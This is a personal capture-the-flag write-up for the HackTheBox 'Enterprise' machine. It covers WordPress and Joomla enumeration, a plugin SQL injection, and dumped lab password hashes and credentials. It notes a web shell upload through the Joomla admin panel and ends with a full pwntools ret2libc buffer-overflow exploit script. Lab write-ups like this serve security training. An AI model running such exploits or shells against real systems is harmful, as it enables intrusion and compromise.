# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
<!--⚠️Imgur upload failed, check dev console-->
![[Pasted image 20240509222840.png]]
#### Port 80
- `WordPress 4.8.1`
[+] XML-RPC seems to be enabled: http://enterprise.htb/xmlrpc.php
![[Pasted image 20240509223512.png]]
#### Port 443
![](https://i.imgur.com/cgZhbqY.png)
![](https://i.imgur.com/6K5Oy1h.png)
![](https://i.imgur.com/dohhLyh.png)
- This Site Used to Give us hint on the port `32812`. So we need to get the wp-config.php then we can access that port, we need to exploit port `80`
	- DB Localtion: `/var/www/html/wp-config.php`
- I thought it has connection with the port `32812`, but it is nothing worked out.
	- ![](https://i.imgur.com/bXR7PiA.png)
	- I saw the plugin, so my another though is if this thing is wordpress plugin
- Yeap it is working.![](https://i.imgur.com/3z5Drmj.png)
	- Based on the code, we have sqli
- ![](https://i.imgur.com/ZbaOpb9.png)
![](https://i.imgur.com/sW202ax.png)
```
# Joomladb
geordi.la.forge@enterprise.htb : $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy
guinan@enterprise.htb : $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q

# Worpress 
william.riker : $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.
```
- the hash is not being Cracked
- I checked the "wp_post" table.
![](https://i.imgur.com/KP8UQb4.png)
` ZxJyhGem4k338S2Y , enterprisencc170 , u*Z14ru0p#ttj83zS6, ZD3YxfnSjezg67JZ `
![](https://i.imgur.com/3FPXcsV.png)
we got the creds ` wiliam.riker : u*Z14ru0p#ttj83zS6` - wordpress
` geordi.la.forge : ZD3YxfnSjezg67JZ ` - Joomla
#### Port 8080
![](https://i.imgur.com/foVP65b.png)
![](https://i.imgur.com/9obyjj9.png)

#### Port 32812
<!--⚠️Imgur upload failed, check dev console-->
![[Pasted image 20240509224040.png]]
![](https://i.imgur.com/zYVb5rE.png)

### Gaining Access
![](https://i.imgur.com/ZTzsXzS.png)

![](https://i.imgur.com/cKnsBQF.png)
` $password = 'NCC-1701E';`
![](https://i.imgur.com/Sk0pDCl.png)

## Internal
### Enumeration
MYSQL_PORT=tcp://172.17.0.2:3306
MYSQL_PORT_3306_TCP=tcp://172.17.0.2:3306
mysql://root:password@localhost:3306/wordpress

![](https://i.imgur.com/45Ea5vf.png)

/wordpress/mysql

/proc/*/mountinfo

![](https://i.imgur.com/CF9Sxyo.png)
```
/tmp/.sam
/tmp/.sam/enum.py
/tmp/.sam/enum.sh
/tmp/.sam/enummod.txt
/tmp/.sam/joomsearch.txt
/tmp/.sam/joopsearch.txt
```

/usr/src/wordpress

![](https://i.imgur.com/qUU6YGq.png)
![](https://i.imgur.com/LfDIHwl.png)
![](https://i.imgur.com/GGCzJmW.png)
- Nothing FOund, SO i went back to the joomla and logged in with the another credentials i got and uploaded a shell
	- `http://enterprise.htb:8080/administrator/index.php?option=com_extplorer&tmpl=component`
	- ![](https://i.imgur.com/DXjBivv.png)
![](https://i.imgur.com/8SqwNOw.png)
- They are 2 different docker instance
![](https://i.imgur.com/dvKiBu2.png)
` xxj31ZMTZzkVA `
![](https://i.imgur.com/jTpzPIi.png)
![](https://i.imgur.com/rlggBNc.png)
/usr/src/joomla/libraries/vendor/web.config
-rw-r--r-- 1 www-data www-data 183 Aug 14  2017 /var/www/html/libraries/vendor/web.config

### Gaining Access
- Nothing here, But 1 weird thing, the folder `files` is accessable from port `443` and port `8080` , Based on our enumeration they have different web server. so lets try to execute commands an get RCE on it
![](https://i.imgur.com/xwAAgEu.png)
### Maintaining Access
![](https://i.imgur.com/tOa1sjp.png)
![](https://i.imgur.com/m0EQP2q.png)
`picarda1`
- we tried the mains it returns and i got buffer overflow on it.
- ![](https://i.imgur.com/CsHRuAE.png)
Detail on [[Reverse Engineering]]
```python
from pwn import *

r = remote('10.129.211.4',32812)
context(os='linux',arch='i386')

junk = b"\x90" * 212

ret2libc = p32(0xf7e4c060)
ret2libc += p32(0xf7e3faf0)
ret2libc += p32(0xf7f6ddd5)

payload = junk + ret2libc

r.recvuntil(b"Enter Bridge Access Code:")
r.sendline(b"picarda1")
r.recvuntil(b"Waiting for input:")
r.sendline(b"4")
r.recvuntil(b"Enter Security Override:")
r.sendline(payload)

r.interactive()
```

![](https://i.imgur.com/xInr6kC.png)

# Random Notes
http://enterprise.htb/wp-content/themes/twentyseventeen/

